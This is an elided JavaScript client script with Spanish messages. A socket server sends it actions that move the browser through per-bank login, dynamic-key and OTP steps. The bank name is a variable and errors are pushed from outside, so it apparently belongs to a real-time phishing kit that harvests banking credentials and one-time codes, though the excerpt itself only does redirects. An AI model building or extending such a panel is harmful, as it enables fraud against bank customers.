...
(function () {
    ...
    function buildStepUrl(step) {
        // si hay bank => /{bank}/step/{step}
        if (RT.bank) return `/${RT.bank.toLowerCase()}/step/${step}`;

        // si NO hay bank => /step/{step}
        return `step/${step}`;
    }
        ...
        try {
            ...
            socket.emit("user:get_session", (sync) => {
                ...
                if (current && String(expected) !== current) {
                    ...
                    window.location.href = `/${RT.bank}/step/${expected}`;
                    return;
                }
    ...
    function bindListeners(sock) {
        ...
        sock.on("session:update", (s) => {
            ...
            if (isWaitingAction(action)) {
                RT._seenWait = true;
                const loadingText = action.startsWith("AUTH")
                    ?  "Autenticando..."
                      : currentStep === "3"
                        ? "Validando..."
                        : currentStep === "4"
            ...
            if (action === "AUTH_ERROR") {
                ...
                window.location.href = `/${RT.bank}`; // start => step1
                return;
            }
            ...
            if (action === "DINAMIC_ERROR") {
                ...
                window.location.href = `/${RT.bank}/step/3`;
                return;
            }
            ...
            if (action === "OTP_ERROR") {
                ...
                window.location.href = `/${RT.bank}/step/4`;
                return;
            }
            ...
            if (expectedStep && String(expectedStep) !== String(currentStep) && action != "FINISH") {
                ...
                if (shouldShowSuccess) {
                    ...
                    setTimeout(() => {
                        safeShowLoading("Redirigiendo...");
                        window.location.href = `/${RT.bank}/step/${expectedStep}`;
                    }, 2000);
